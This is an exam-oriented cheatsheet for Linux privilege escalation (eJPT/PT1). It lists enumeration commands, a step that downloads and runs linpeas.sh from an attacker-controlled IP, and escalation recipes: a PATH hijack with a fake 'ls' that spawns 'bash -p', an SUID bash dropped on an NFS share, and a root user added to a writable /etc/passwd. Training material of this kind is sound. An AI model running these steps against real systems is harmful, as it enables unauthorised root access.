# Linux Privilege Escalation – Workflow & Cheatsheet (eJPT / PT1)

This markdown cheatsheet provides a **fast, exam-oriented Linux privilege escalation methodology**, combining manual techniques, automation, and common misconfiguration patterns frequently tested in **eJPT / PT1** exams.

---

## 1. Privilege Escalation Workflow

Follow this structured audit to systematically uncover escalation vectors.

### 1. Stabilize Shell
Upgrade to a full TTY for better usability:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

---

### 2. Basic Recon (Always First)
```bash
id
whoami
groups
sudo -l
uname -a
cat /etc/os-release
```

**Goal:**  
Identify user groups, sudo rules, kernel version, and OS for exploit research.

---

### 3. Automated Enumeration
Use automation to highlight attack paths quickly.

```bash
wget http://<YOUR_IP>/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

Tips:
- Run in `/tmp`
- Use `./linpeas.sh -a` for aggressive mode
- Pipe to pager: `./linpeas.sh | less`

---

### 4. Manual Deep Dive (High-Value Checks)

#### Processes & Cron Jobs
```bash
ps aux | grep root
cat /etc/crontab
ls -la /etc/cron*
```
Look for:
- Writable scripts
- Wildcards (`*`)
- PATH hijacking

---

#### SUID & Capabilities
```bash
find / -perm -u=s -type f 2>/dev/null
getcap -r / 2>/dev/null
```
Map binaries to **GTFOBins** for abuse.

---

#### Environment & PATH
```bash
echo $PATH
env | grep PATH
ls -la /tmp /var/tmp /dev/shm
```
Writable directories early in PATH = instant escalation.

---

#### Files, Services, Networking
```bash
netstat -tulnp
find / -writable -type f 2>/dev/null
ls -la /etc/passwd /etc/shadow
```

---

### 5. Prioritize & Exploit
- Match findings with:
  - GTFOBins
  - Exploit-DB
- Start with **low-risk misconfigurations**
- Avoid unstable kernel exploits unless necessary

---

### 6. Verify Access
```bash
whoami
id
```
Clean up artifacts if required.

---

## 2. Command Cheatsheet

| Category | Command | Purpose | eJPT Relevance |
|-------|--------|--------|---------------|
| User Context | `id; groups; whoami` | Identify privileges | Core |
| Kernel Info | `uname -a; /proc/version` | Exploit research | Medium |
| SUID | `find / -perm -4000 -type f` | Privileged binaries | High |
| Capabilities | `getcap -r /` | Cap abuse | Medium |
| Cron Jobs | `cat /etc/crontab` | Scheduled root jobs | High |
| PATH | `echo $PATH` | Hijacking | High |
| Writable Files | `find / -writable` | Config/script abuse | High |
| Processes | `ps aux | grep root` | Injection targets | Medium |
| NFS | `showmount -e localhost` | no_root_squash | Low |

---

## 3. Common Privilege Escalation Techniques (Well-Known)

### Sudo Misconfigurations
```bash
sudo -l
```
Examples:
- `sudo vim`
- `sudo find`
- `sudo nmap`

➡ Check GTFOBins immediately.

---

### Writable Cron Scripts
- Replace script
- Abuse wildcards
- PATH hijacking

---

### SUID Binary Abuse
Common targets:
- `find`
- `python`
- `bash`
- `env`
- `vim`

---

### PATH Hijacking
If root runs scripts without absolute paths:
```bash
echo 'bash -p' > ls
chmod +x ls
export PATH=/tmp:$PATH
```

---

### /etc/passwd Write Access
```bash
openssl passwd -1 password
```
Insert new root user if writable.

---

### NFS no_root_squash
Mount and drop SUID binary:
```bash
cp /bin/bash .
chmod +s bash
```

---

## 4. Tool Highlights

### LinPEAS
- Covers ~80% of enum
- Color-coded output
- Never exploit blindly—verify manually

### Alternatives
- **LinEnum.sh** – Lightweight
- **pspy** – Monitor cron/jobs without root

---

## 5. eJPT / PT1 Exam Mapping

- Expect **1–2 Linux privilege escalations**
- Focus on:
  - Sudo abuse
  - SUID binaries
  - Cron misconfigs
- Kernel exploits are rare
- Target time: **≤ 15 minutes per box**

📌 **Reporting Tip:**  
Document *vector → command → result*  
Example:
> SUID `find` abused via GTFOBins to gain root shell.

---

## 6. Final Advice

- Enumerate before exploiting
- Prefer misconfigurations over exploits
- Practice full workflow repeatedly
- Speed + accuracy > complexity

---
